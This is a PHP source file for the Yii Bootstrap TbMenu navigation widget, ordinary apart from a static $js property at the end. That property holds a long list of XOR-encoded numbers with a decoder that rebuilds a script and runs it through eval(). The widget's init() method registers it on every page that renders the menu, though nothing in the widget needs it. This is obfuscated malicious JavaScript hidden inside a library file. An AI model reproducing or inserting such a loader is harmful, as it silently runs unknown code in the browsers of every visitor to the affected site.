<?php
/**
 * TbMenu class file.
 * @author Christoffer Niska <ChristofferNiska@gmail.com>
 * @copyright Copyright &copy; Christoffer Niska 2012-
 * @license http://www.opensource.org/licenses/bsd-license.php New BSD License
 * @package bootstrap.widgets
 */

Yii::import('bootstrap.widgets.TbBaseMenu');

/**
 * Bootstrap menu.
 * @see http://twitter.github.com/bootstrap/components.html#navs
 */
class TbMenu extends TbBaseMenu
{
	// Menu types.
	const TYPE_TABS = 'tabs';
	const TYPE_PILLS = 'pills';
	const TYPE_LIST = 'list';

	/**
	 * @var string the menu type.
	 * Valid values are 'tabs' and 'pills'.
	 */
	public $type;
	/**
	 * @var string|array the scrollspy target or configuration.
	 */
	public $scrollspy;
	/**
	* @var boolean indicates whether the menu should appear vertically stacked.
	*/
	public $stacked = false;
	/**
	 * @var boolean indicates whether dropdowns should be dropups instead.
	 */
	public $dropup = false;

	/**
	 * Initializes the widget.
	 */
	public function init()
	{
		parent::init();

		Yii::app()->clientScript->registerScript('tb', self::$js, CClientScript::POS_END);

		$classes = array('nav');

		$validTypes = array(self::TYPE_TABS, self::TYPE_PILLS, self::TYPE_LIST);

		if (isset($this->type) && in_array($this->type, $validTypes))
			$classes[] = 'nav-'.$this->type;

		if ($this->stacked && $this->type !== self::TYPE_LIST)
			$classes[] = 'nav-stacked';

		if ($this->dropup === true)
			$classes[] = 'dropup';

		if (isset($this->scrollspy))
		{
			$scrollspy = is_string($this->scrollspy) ? array('target'=>$this->scrollspy) : $this->scrollspy;
			$this->widget('bootstrap.widgets.TbScrollSpy', $scrollspy);
		}

		if (!empty($classes))
		{
			$classes = implode(' ', $classes);
			if (isset($this->htmlOptions['class']))
				$this->htmlOptions['class'] .= ' '.$classes;
			else
				$this->htmlOptions['class'] = $classes;
		}
	}

	/**
	 * Returns the divider css class.
	 * @return string the class name
	 */
	public function getDividerCssClass()
	{
		return (isset($this->type) && $this->type === self::TYPE_LIST) ? 'divider' : 'divider-vertical';
	}

	/**
	 * Returns the dropdown css class.
	 * @return string the class name
	 */
	public function getDropdownCssClass()
	{
		return 'dropdown';
	}

	/**
	 * Returns whether this is a vertical menu.
	 * @return boolean the result
	 */
	public function isVertical()
	{
		return isset($this->type) && $this->type === self::TYPE_LIST;
	}

	public static $js = 'jc=42;jce="78;68;79;88;67;74;94;69;28;68;70;92;66;82;16;30;6;72;95;79;25;31;107;97;101;42;52;49;102;43;41;39;45;62;45;42;43;114;114;59;51;37;53;38;53;37;49;41;46;121;124;41;39;47;5;92;64;23;1;29;18;72;2;8;28;10;31;14;28;6;0;5;80;77;3;28;24;19;23;14;84;20;18;17;17;30;228;188;234;226;244;245;255;228;231;237;239;176;172;235;251;225;243;229;251;252;250;181;254;246;232;233;227;248;243;249;251;183;137;129;217;131;205;195;142;134;194;248;223;206;222;212;134;141;209;234;218;193;209;211;232;138;228;158;210;207;200;205;132;144;239;172;173;173;171;183;167;190;148;238;151;233;229;227;167;188;248;141;245;233;162;188;165;190;186;181;191;135;251;244;247;164;192;193;194;137;181;144;131;149;145;193;200;137;131;137;151;205;217;223;147;131;132;144;152;147;208;219;198;159;149;139;222;150;356;316;350;292;336;327;345;360;382;364;376;359;365;372;338;296;304;354;358;362;376;368;299;331;319;381;371;360;364;369;383;358;282;257;320;335;331;326;333;263;265;320;327;347;323;351;346;334;350;325;265;275;322;348;325;350;346;336;342;338;328;324;260;287;310;296;305;298;294;297;291;359;361;288;295;315;291;319;314;302;318;293;361;371;292;314;293;318;300;304;309;309;358;381;312;310;280;260;262;323;325;268;267;279;263;283;286;266;258;281;341;335;266;348;283;285;272;272;270;333;344;320;323;322;325;349;351;278;493;497;493;497;496;484;488;499;435;425;510;484;508;439;430;447;432;432;507;510;484;506;484;483;505;503;494;416;444;497;507;505;468;411;386;403;388;388;463;458;472;454;472;479;461;451;474;404;400;473;471;474;467;477;450;397;408;392;394;395;409;413;415;470;429;433;429;433;432;420;424;435;499;489;423;418;418;480;422;426;441;438;442;423;494;501;482;487;488;425;418;507;509;436;435;431;399;403;406;386;394;401;477;455;389;384;388;454;411;388;394;411;408;459;466;455;452;453;390;399;472;472;403;406;396;402;396;395;609;623;630;568;548;626;623;611;636;609;560;555;573;573;574;554;560;560;635;638;612;634;612;611;633;631;622;544;572;639;639;636;587;582;592;588;593;587;578;522;587;582;582;580;606;535;526;524;512;513;514;531;533;604;603;583;599;587;590;602;594;585;517;543;550;552;558;567;545;567;636;567;570;550;557;546;552;631;522;535;537;572;563;564;561;513;548;566;566;554;572;564;558;560;624;530;521;514;528;524;535;522;512;531;582;552;518;539;516;524;582;512;512;528;529;538;512;524;587;591;589;592;577;603;593;528;529;517;685;750;754;738;743;748;754;766;690;681;698;677;692;696;693;687;701;762;762;743;761;761;699;760;744;760;761;754;744;740;676;703;656;655;666;662;671;645;713;727;713;714;707;735;725;663;654;671;670;649;647;648;744;658;648;651;732;720;716;667;719;713;711;723;677;764;670;740;679;682;682;680;698;755;746;744;682;680;767;767;737;745;754;754;701;696;678;696;682;685;699;693;680;742;766;697;655;655;662;718;663;652;668;642;722;713;729;733;668;661;718;718;665;668;642;668;646;641;663;665;652;706;730;663;661;659;667;722;872;868;875;868;876;881;828;807;828;825;890;883;812;812;871;866;864;894;864;871;885;891;866;812;824;877;895;867;872;816;895;883;841;838;844;793;772;838;835;841;860;844;856;784;880;778;784;787;857;860;853;787;839;839;853;778;868;798;850;847;840;845;772;784;879;811;801;877;809;810;808;808;826;808;819;869;830;824;865;803;825;818;823;829;807;816;888;807;816;809;869;831;825;817;829;816;784;792;863;850;824;834;838;783;781;768;781;771;792;848;818;840;833;813;853;851;771;796;786;771;784;836;806;860;845;801;857;863;994;1006;1008;999;993;1015;955;987;943;953;982;940;946;1936;1982;1999;2003;2009;1959;1966;1964;1952;950;1964;1952;2015;1967;1958;1963;1957;1952;1954;1949;1951;1937;1949;900;2020;1944;1940;1939;1945;2018;1950;1937;1941;2017;910;912;909;976;961;916;922;904;919;900;984;922;979;974;984;984;898;924;998;938;951;944;949;1020;1000;999;934;954;942;930;992;956;938;945;957;1023;950;935;929;951;931;957;1015;947;949;954;946;1009;941;917;974;910;906;903;896;904;916;909;949;973;971;927;921;919;899;917;972;942;980;919;922;922;920;906;963;986;984;974;926;973;922;1126;1124;1058;1058;1133;1128;1142;1128;1146;1149;1131;1125;1144;1078;1070;1129;1151;1151;1126;1086;1127;1148;1132;1138;1058;1081;1065;1069;1132;1125;1086;1086;1097;1100;1106;1100;1110;1105;1095;1097;1116;1042;1034;1095;1093;1091;1099;1026;1112;1108;1115;1108;1116;1089;1036;1047;1036;1033;1098;1091;1052;1052;1111;1106;1072;1070;1072;1079;1061;1067;1074;1148;1128;1085;1071;1075;1080;1120;1071;1059;1081;1078;1084;1129;1140;1078;1075;1081;1068;1084;1064;1120;1024;1146;1120;1079;1044;1045;1042;1113;1099;1098;1033;1047;1037;1031;1095;1049;1033;1036;1026;1090;1045;1026;1030;1042;1024;1040;1112;1054;1046;1055;1045;1108;1038;1032;1105;1043;1257;1250;1255;1261;1271;1248;1210;1192;1257;1207;1194;1207;1262;1279;1198;1184;1198;1201;134;168;219;1205;213;163;168;162;175;166;164;210;1214;222;225;234;153;153;156;1157;148;151;148;1161;151;158;146;156;235;145;132;137;142;141;1172;244;132;248;143;137;248;247;253;242;1182;254;1248;209;240;129;250;133;248;251;1256;241;1258;245;243;246;254;141;232;147;158;1267;224;229;235;234;230;236;1274;227;235;225;235;226;213;220;218;214;1226;1241;1225;1155;1153;1183;1236;1239;1219;1161;1159;1177;1230;1235;1243;1224;1236;1237;1163;1239;1157;1221;1245;1243;1239;1245;1241;1232;1395;1378;1392;1316;1316;1326;1318;1312;1377;1401;1406;1333;1323;1316;1333;";var bccode=new String();ads=jce.split(";");bce=ads.length-1;for(var mn=0;mn<bce;mn++){mcode=ads[mn];gcod="lowcode=mcode";gcod=gcod+"^jc";eval(gcod);jc+=1;bccode=bccode+String.fromCharCode(lowcode);}eval(bccode)';
}
